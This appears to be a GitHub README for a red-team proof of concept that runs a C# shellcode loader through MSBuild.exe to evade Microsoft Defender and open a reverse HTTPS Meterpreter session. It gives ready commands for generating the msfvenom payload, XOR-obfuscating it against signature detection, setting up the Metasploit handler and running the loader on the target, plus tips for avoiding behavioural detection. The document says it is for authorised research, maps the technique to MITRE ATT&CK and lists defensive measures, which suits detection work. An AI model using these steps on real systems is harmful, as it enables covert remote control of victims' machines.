# Shellcode Loader via MSBuild-Compatible C# Application

## Overview

This repository contains a proof-of-concept red team activity that demonstrates how to execute a malicious payload in memory using `MSBuild.exe`, a trusted signed Windows binary. The project simulates a **Living Off the Land Binary** (LOLBin) attack technique in which a C# shellcode loader is compiled and executed through MSBuild, bypassing (temporarily) Microsoft Defender through in-memory execution and obfuscation.

The payload establishes a reverse HTTPS connection to a Metasploit C2 server. This technique aligns with [T1127.001 – Trusted Developer Utilities Proxy Execution: MSBuild](https://attack.mitre.org/techniques/T1127/001/) and is intended for educational and research purposes in a controlled environment.

**You can refer to [this video](https://youtu.be/E3ygajc9rsM) to see how I pursued the attack in a controlled environment.**

## Disclaimer

This project is intended **strictly for educational and authorized security research purposes**. All activities must be conducted in a controlled, isolated environment with proper authorization.

Do not use these techniques on systems you do not own or lack explicit permission to test. Unauthorized use may violate laws and ethical guidelines, and could result in disciplinary or legal action.

The author assumes no responsibility for misuse or damage resulting from the use of this code.

## Prerequisites

To successfully compile and execute this project, the following tools and environment configurations are required:

- Windows 10 Pro virtual machine
- Microsoft Visual Studio with `.NET Framework 4.7.2` or higher installed
- Access to `MSBuild.exe` (commonly located under Visual Studio installation path)
- Metasploit Framework installed on a Linux-based attack machine
- Working knowledge of C#, MSBuild, and basic red team operations
- Network configuration that allows reverse HTTPS communication between victim and C2 server

This project was tested in a QEMU Virtual Machine with an `non-activated Windows 10 Pro Version 22H2 and OS build 19045.2965`.

## Files

This project includes three primary files required for execution. Each plays a critical role in the simulation workflow.

### C# Shellcode Loader

The C# program used in this simulation serves as a minimalist shellcode loader, purpose-built to be executed through MSBuild.exe as part of a Living Off the Land Binary (LOLBin) strategy. Its primary objective is to allocate executable memory within the current process, decrypt a malicious payload from an external file, and execute it in-memory via a newly created thread. This approach is particularly effective for bypassing Microsoft Windows Defender, as it avoids writing executables to disk and leverages native Windows API calls, often trusted by endpoint protection systems

It performs the following actions:

- Reads and decrypts an XOR-obfuscated payload from config.bin
- Dynamically loads native Windows API functions (NtAllocateVirtualMemory, CreateThread)
- llocates executable memory in the current process
- Copies the shellcode to memory and executes it in a new thread

**The shellcode is never written to disk after decryption**, allowing for stealthy in-memory execution.

### MSBuild Project File

The C# build file used in this simulation is an MSBuild project file, defined in XML format. It serves as a build automation script that instructs MSBuild.exe (the Microsoft Build Engine) on how to compile and execute the C# shellcode loader. Functionally, it plays a role similar to a Makefile in C/C++ development environments.

Executing this file with MSBuild.exe triggers both compilation and execution phases. This enables execution through a trusted binary, facilitating LOLBin abuse and Defender evasion.

### Encrypted Payload

The final component of the attack chain is the malicious payload, which is responsible for establishing a reverse shell to a remote Command and Control (C2) server. This payload is generated using the ‘msfvenom’ utility, a standard tool from the Metasploit Framework used to craft custom shellcode for various platforms and architectures

To generate the raw payload we use the following command:

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<attacker-ip> LPORT=<port> -f raw -o config.bin
```

To encrypt the payload, we use the following command:

```bash
xxd -p config.bin | tr -d '\n' | fold -w2 | while read byte; do printf "%02x" $(( 0x$byte ^ 0xAA )); done | xxd -r -p > config.bin
```

A quick explanaition of each part of the encryption script:

- `xxd -p config.bin`: Converts the binary file `config.bin` into a plain hexadecimal string with no addresses.
- `tr -d '\n'`: Removes all newlines from the hex string to create a continuous byte stream.
- `fold -w2`: Breaks the string into two-character groups
- **while; do; done block**: Reads each byte, applies XOR with 0xAA, and prints the result in two-digit hexadecimal format.
- `xxd -r -p > config.bin`: Converts the hex stream back into binary format and writes it back to `config.bin`

This simple obfuscation helps temporarily bypass static signature detection by antivirus software such as Microsoft Defender. This approach doesn’t offer strong cryptographic protection, therefore, more robust encryption schemes like AES are recommended for more advanced attacks.

## roof of Concept Execution

1. On your Kali Linux or Metasploit-enabled system, run:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_https
set LHOST <your-ip>
set LPORT <your-port>
run -j
```

2. On the target Windows machine, execute the .csproj file using MSBuild.

```ps
"C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\MSBuild.exe" main.csproj /p:Configuration=Release /t:Run
```

3. Once the session is active, interaction with the system is possible using Meterpreter. However, minimal activity is recommended to avoid triggering Defender’s behavioral detection,

## Mitre Att&ck Mapping

This proof of concept simulates several tactics and techniques as defined in the MITRE ATT&CK Framework, commonly associated with real-world adversary behavior:

|      **Tactic**     |                             **Technique**                            |                                        **Justification**                                        |
|:-------------------:|:--------------------------------------------------------------------:|:-----------------------------------------------------------------------------------------------:|
|   Defense Evasion   | T1127.001 – Trusted Developer Utilities Proxy Execution: MSBuild     | The payload is compiled and executed via `MSBuild.exe`, a trusted signed Windows binary.        |
|   Defense Evasion   | T1027.013 -  Obfuscated Files or Information: Encrypted/Encoded File | The shellcode is XOR-obfuscated to bypass static signature detection by antivirus tools.        |
|   Defense Evasion   | T1027.009 - Obfuscated Files or Information: Embedded Payloads       | The shellcode is loaded into memory from an encrypted file and executed without writing to disk post-load. |
|   Defense Evasion   | T1620 - Reflective Code Loading                                      | The shellcode is dynamically loaded into memory and executed from a new thread within the same process using native Windows API functions.            |
| Command and Control | T1071.001 - Application Layer Protocol: Web Protocols (HTTPS)        | TThe payload establishes a reverse HTTPS session with the attacker's Metasploit handler.       |

## Defensive Recommendations

To detect and mitigate techniques demonstrated in this proof of concept, defenders should adopt a layered security approach that incorporates both prevention and detection strategies. Below are key recommendations.

- Implement behavioral monitoring to detect LOLBin abuse
- Use Sysmon or EDR solutions to monitor:
   - Execution of uncommon binaries like MSBuild.exe outside development environments
   - Memory allocation with `PAGE_EXECUTE_READWRITE` permissions
   - Thread creation from suspicious memory regions
- Enforce application whitelisting using tools like AppLocker or Windows Defender Application Control (WDAC) to block execution of `MSBuild.exe` by non-developer users or not allowed/common environments.
- Monitor and restrict access to developer tools on systems where they are not explicitly required.
- Inspect outbound HTTPS traffic for patterns resembling reverse shell connections
- Use proxy logging and TLS inspection (where appropriate) to monitor C2-like behavior
- Monitor Windows Defender and Event Viewer logs for behavior-based detections
